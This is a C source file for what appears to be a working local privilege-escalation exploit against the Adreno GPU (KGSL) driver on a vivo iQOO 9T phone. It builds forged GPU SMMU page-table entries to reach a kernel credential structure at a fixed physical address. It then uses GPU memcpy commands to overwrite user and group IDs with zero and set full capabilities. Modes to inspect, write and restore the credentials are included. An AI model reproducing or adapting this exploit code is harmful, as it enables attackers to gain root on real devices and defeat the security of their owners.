/* One-shot, target-specific credential experiment. No kernel text writes. */
#define main unused_cheese_main
#include "../../references/vivo-iqoo-9t/tools/device/cheese_pa.c"
#undef main

#define CP_MEMCPY 0x75
#define PAGE_BYTES 4096
#ifndef TARGET_CRED_PA
#define TARGET_CRED_PA 0xc86f6300ULL
#endif
#define FAKE_TARGET (kFakeGpuAddr)
#define FAKE_SOURCE (kFakeGpuAddr + PAGE_BYTES)
#define FAKE_OUTPUT (kFakeGpuAddr + 2 * PAGE_BYTES)
#define FAKE_TABLE (kFakeGpuAddr + 3 * PAGE_BYTES)

static int submit_copy(int fd, uint32_t ctx, uint32_t *payload,
                       uint64_t payload_va, uint64_t table_pa,
                       unsigned char *table, uint64_t from, uint64_t to,
                       unsigned dwords, uint32_t marker) {
    *(uint32_t *)(table + 0x100) = 0;
    sync_cache_to_gpu(table, table + PAGE_BYTES);
    memset(payload, 0, PAGE_BYTES);
    uint32_t *draw = payload + 0x100;
    uint32_t *p = draw;
    *p++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    p += cp_gpuaddr(p, table_pa);
    *p++ = 0;
    *p++ = 0;
    p += cp_wait_for_me(p);
    p += cp_wait_for_idle(p);
    *p++ = cp_type7_packet(CP_MEMCPY, 5);
    *p++ = dwords;
    p += cp_gpuaddr(p, from);
    p += cp_gpuaddr(p, to);
    *p++ = cp_type7_packet(CP_MEM_WRITE, 3);
    p += cp_gpuaddr(p, FAKE_TABLE + 0x100);
    *p++ = marker;
    uint32_t *q = payload;
    *q++ = cp_type7_packet(CP_SET_MODE, 1);
    *q++ = 1;
    *q++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
    *q++ = (p - draw) | ((DRAW_STATE_MODE_BINNING |
            DRAW_STATE_MODE_GMEM | DRAW_STATE_MODE_BYPASS) << 20);
    q += cp_gpuaddr(q, payload_va + 0x100 * sizeof(uint32_t));
    sync_cache_to_gpu(payload, (char *)payload + PAGE_BYTES);
    int rc = kgsl_gpu_command_payload(fd, ctx, 0, 0, 1, 0,
                                     payload_va, (q - payload) * 4);
    if (rc) return rc;
    for (int i = 0; i < 500; ++i) {
        sync_cache_from_gpu(table + 0x100, table + 0x104);
        if (*(volatile uint32_t *)(table + 0x100) == marker) return 0;
        usleep(10000);
    }
    return -1;
}

int main(int argc, char **argv) {
    if (argc != 3 || (strcmp(argv[1], "--inspect") &&
                      strcmp(argv[1], "--write") &&
                      strcmp(argv[1], "--write-full") &&
                      strcmp(argv[1], "--write-shell-full") &&
                      strcmp(argv[1], "--restore-full")) ||
        strtoull(argv[2], NULL, 0) != TARGET_CRED_PA) {
        fprintf(stderr, "usage: %s --inspect|--write|--write-full|--write-shell-full|--restore-full 0x%llx\n", argv[0],
                (unsigned long long)TARGET_CRED_PA);
        return 2;
    }
    g_level1_dcache_size = tu_get_l1_dcache_size();
    unsigned char *source = mmap(NULL, PAGE_BYTES, PROT_READ | PROT_WRITE,
                                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *output = mmap(NULL, PAGE_BYTES, PROT_READ | PROT_WRITE,
                                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *table = mmap(NULL, PAGE_BYTES, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    uint32_t *payload = mmap(NULL, PAGE_BYTES, PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (source == MAP_FAILED || output == MAP_FAILED || table == MAP_FAILED ||
        payload == MAP_FAILED) return 3;
    mlock(source, PAGE_BYTES);
    mlock(output, PAGE_BYTES);
    mlock(table, PAGE_BYTES);
    source[0] = output[0] = table[0] = 1;
    uint64_t source_pa = leak_phys_page(source);
    uint64_t output_pa = leak_phys_page(output);
    uint64_t table_pa = leak_phys_page(table);
    if (!source_pa || !output_pa || !table_pa) return 4;
    memset(output, 0xa5, PAGE_BYTES);
    sync_cache_to_gpu(output, output + PAGE_BYTES);
    printf("owned pages: source=%llx output=%llx table=%llx\n",
           (unsigned long long)source_pa, (unsigned long long)output_pa,
           (unsigned long long)table_pa);
    memset(table, 0, PAGE_BYTES);
    uint64_t attr = ENTRY_VALID | ENTRY_RW | ENTRY_MEMTYPE_NNC |
                    ENTRY_OUTER_SHARE | ENTRY_AF | ENTRY_NG;
    uint64_t *pte = (uint64_t *)table;
    pte[1] = table_pa | ENTRY_VALID;
    pte[2] = table_pa | ENTRY_VALID;
    pte[3] = (TARGET_CRED_PA & ~(uint64_t)(PAGE_BYTES - 1)) | attr;
    pte[4] = source_pa | attr;
    pte[5] = output_pa | attr;
    pte[6] = table_pa | attr;
    sync_cache_to_gpu(table, table + PAGE_BYTES);

    int fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return 5;
    uint32_t ctx;
    if (kgsl_ctx_create0(fd, &ctx)) return 6;
    uint64_t payload_va;
    if (kgsl_map(fd, (unsigned long)payload, PAGE_BYTES, &payload_va)) return 7;
    unsigned offset = TARGET_CRED_PA & (PAGE_BYTES - 1);
    if (!strcmp(argv[1], "--write") || !strcmp(argv[1], "--write-full") ||
        !strcmp(argv[1], "--write-shell-full") ||
        !strcmp(argv[1], "--restore-full")) {
        int restore = !strcmp(argv[1], "--restore-full");
        int shell_full = !strcmp(argv[1], "--write-shell-full");
        int full = !strcmp(argv[1], "--write-full") || shell_full || restore;
        for (int i = 0; i < 8; ++i)
            *(uint32_t *)(source + offset + 4 + 4 * i) = restore ? 2000 : 0;
        if (full) {
            memset(source + offset + 0x24, 0, 0x24);
            *(uint32_t *)(source + offset + 0x24) = shell_full ? 0 : 0x2f;
            *(uint64_t *)(source + offset + 0x30) = restore ? 0 : 0x3ffffffffffULL;
            *(uint64_t *)(source + offset + 0x38) = restore ? 0 : 0x3ffffffffffULL;
            *(uint64_t *)(source + offset + 0x40) = restore ? 0xc0 : 0x3ffffffffffULL;
        }
        sync_cache_to_gpu(source, source + PAGE_BYTES);
        int write_rc = submit_copy(fd, ctx, payload, payload_va, table_pa, table,
                                   FAKE_SOURCE + offset + 4,
                                   FAKE_TARGET + offset + 4,
                                   full ? 17 : 8, 0x789abc02);
        printf("single-submit %s completion=%d\n", argv[1] + 2, write_rc);
        kgsl_ctx_destroy(fd, ctx);
        close(fd);
        return write_rc ? 12 : 0;
    }
    int rc = submit_copy(fd, ctx, payload, payload_va, table_pa, table,
                         FAKE_TARGET + offset, FAKE_OUTPUT + offset,
                         0x80 / 4, 0x789abc01);
    if (rc) { printf("preflight copy failed: %d\n", rc); return 8; }
    sync_cache_from_gpu(output + offset, output + offset + 0x80);
    uint32_t *old = (uint32_t *)(output + offset);
    printf("preflight raw: %08x %08x %08x %08x\n",
           old[0], old[1], old[2], old[3]);
    if (old[0] != 2 || old[9] != 0x2f) {
        printf("preflight refused: usage=%u securebits=%08x\n", old[0], old[9]);
        return 9;
    }
    for (int i = 1; i <= 8; ++i) {
        if (old[i] != 2000) {
            printf("preflight refused: cred field %d=%u\n", i, old[i]);
            return 10;
        }
    }
    for (int i = 10; i <= 15; ++i) {
        if (old[i] != 0) {
            printf("preflight refused: capability field %d=%u\n", i, old[i]);
            return 11;
        }
    }
    if (old[16] != 0xc0 || old[17] != 0) {
        printf("preflight refused: cap bounding=%08x:%08x\n", old[17], old[16]);
        return 12;
    }
    printf("preflight passed: target=%llx usage=%u eight IDs=2000\n",
           (unsigned long long)TARGET_CRED_PA, old[0]);
    kgsl_ctx_destroy(fd, ctx);
    close(fd);
    return 0;
}
